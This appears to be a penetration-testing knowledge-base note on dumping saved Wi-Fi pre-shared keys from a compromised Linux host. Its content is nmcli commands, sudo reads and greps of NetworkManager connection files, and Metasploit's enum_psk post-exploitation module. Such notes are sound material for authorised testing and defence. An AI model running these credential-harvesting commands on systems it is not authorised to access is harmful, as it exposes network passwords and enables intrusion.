# Wi-Fi Keys

## Living off the Land

```
$ nmcli -s connection show "<wifi_name>"

$ nmcli connection show "<wifi_name>" | grep -i psk

$ sudo cat /etc/NetworkManager/system-connections/file.nmconnection

$ sudo grep -r '^psk=' /etc/NetworkManager/system-connections/
```

## Metasploit

```
msf > use post/linux/gather/enum_psk

msf post(linux/gather/enum_psk) > options 

Module options (post/linux/gather/enum_psk):

   Name     Current Setting                          Required  Description
   ----     ---------------                          --------  -----------
   DIR      /etc/NetworkManager/system-connections/  yes       The path for NetworkManager configuration files
   SESSION                                           yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(linux/gather/enum_psk) > run session=<session_ID>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xB - Networking/Scan Network/Wi-Fi Networks/Living off the Land|Enumeration and Discovery: Linux Wi-Fi Networks]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - OS Credential Dumping/Linux/Host/Sensitive Files/Wi-Fi Keys/Living off the Land|Credential Access and Dumping: Linux Wi-Fi Networks]]

### Volexity

- [Volexity: The Nearest Neighbor Attack - How A Russian APT Weaponized Nearby Wi-Fi Networks for Covert Access](https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/)